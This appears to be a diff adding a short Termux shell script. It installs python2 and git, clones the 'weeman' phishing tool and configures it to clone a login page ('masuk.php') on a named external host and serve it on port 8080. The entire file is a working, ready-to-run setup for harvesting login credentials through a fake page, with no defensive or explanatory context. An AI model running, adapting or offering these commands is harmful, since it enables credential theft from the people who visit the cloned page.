@@ -1,0 +1,15 @@
+pkg update
+pkg upgrade
+pkg install python2
+pkg install git
+clear
+git clone https://github.com/evait-secutiry/weeman.git
+cd
+ls
+cd weeman
+python2 weeman.py
+show
+set url http://dewopanel.host22.com/masuk.php
+set port 8080
+set action_url http://dewopanel.host22.com/masuk.php
+run
